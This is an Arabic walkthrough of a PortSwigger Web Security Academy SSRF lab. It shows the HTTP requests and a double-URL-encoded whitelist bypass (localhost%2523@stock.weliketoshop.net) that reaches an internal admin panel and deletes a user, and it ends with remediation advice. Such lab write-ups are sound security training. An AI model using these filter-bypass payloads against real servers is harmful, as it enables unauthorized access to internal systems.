# [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

## **`الهدف`**
قم بتغيير الـ `URL` الخاص بـ `stock check` للوصول إلى واجهة الإدارة على`http://localhost/admin` ثم قم بحذف حساب `carlos`.
## **`خطوات الحل`**
بعد الدخول إلى اللاب سنتوجه إلى أى منتج ونقوم بالضغط على `Check stock` وبعد ذلك سنجد في الـ `HTTP history` الـطلب التالي فسنقوم بتحويله إلى `Repeater`
```http
POST /product/stock HTTP/2
Host: 0a06008803c72d5580ed9fe400d60067.web-security-academy.net
Cookie: session=tgca62uvn0kCaGJosy3geb3LcooXRGSv

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```
ثم سنقوم بتعديل معلم الـ `StocApi` من داخل الـ `Inspector` إلى: `http://localhost/admin` ولكن سنجد أن الاستجابة بها رسالة خطأ
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
X-Content-Encoding: gz
Connection: close
Content-Length: 71

"External stock check host must be stock.weliketoshop.net"
```
لذلك سنعود مرة أخرى ونقوم بعدة محاولات أخرى ولكن مع تضمين هذا الدومين الذي أخبرتنا رسالة الخطأ أنه يجب أن يكون موجود داخل الـ `URL` لكن بعدة اشكال مختلفة حتى نجد أن الذي ينجح معنا هو عندما نغير معلم الـ `StocApi` من داخل الـ `Inspector` إلى
`http://localhost%2523@stock.weliketoshop.net/admin`
```http
POST /product/stock HTTP/2
Host: 0a06008803c72d5580ed9fe400d60067.web-security-academy.net
Cookie: session=WrJlZDItFiIog3VS7sqlHnLDSB5oB0sn

stockApi=http%3a%2f%2flocalhost%2523%40stock.weliketoshop.net%2fadmin%2f
```
وبعد إرساله سنجد أن الاستجابة صحيحة وأصبح لدينا وصول للوحة التحكم.

وسبب ذلك أن `%2523` هو `Double URL Endcoding` لعلامة `#` فبالتالي فإن الكود الخاص بالفلتر يقوم بفك طبقة واحدة فقط ليراه `http://localhost%23@stock.weliketoshop.net/admin` فيظن أن الجزئية قبل علامة الـ `@` والتي هي `localhost%23` مجرد اسم المستخدم فقط والدومين هو `stock.weliketoshop.net/admin` وبالتالي فهو مسموح، ولكن عندما يصل إلى  الكود الذي ينفذ طلب `HTTP` من جانب السيرفر فإنه يقوم بعمل `Double URL Decoding` فيصبح لديه `http://localhost#@stock.weliketoshop.net/admin` وبالتالي يتم تجاهل كل ما هو بعد الـ `#` وقبل الـ `/` فيتوجه الطلب من جانب السيرفر إلى `http://localhost#/admin`

وبفحص الاستجابة سنجد أنه لحذف حساب `carlos` يجب أن نقوم بتعديل معلم الـ `StocApi` إلى `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos` من داخل الـ `Inspector` ونقوم بإرساله
```http
POST /product/stock HTTP/2
Host: 0a9c005703d2e714806b350f00190094.web-security-academy.net
Cookie: session=WrJlZDItFiIog3VS7sqlHnLDSB5oB0sn
Content-Length: 98

stockApi=http%3a%2f%2flocalhost%2523%40stock.weliketoshop.net%2fadmin%2fdelete%3fusername%3dcarlos
```
وبمجرد إرسال الطلب سنجد أن حساب `carlos` تم حذفه لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Basic SSRF against the local server](./Basic-SSRF-against-the-local-server.md)

ويجب تبسيط رسائل الخطأ لتكون عامة جداً `(Generic Error)` مثل `An error occurred` دون إعطاء أي تفاصيل إضافية عن سبب الرفض أو النقاطات المسموحة.
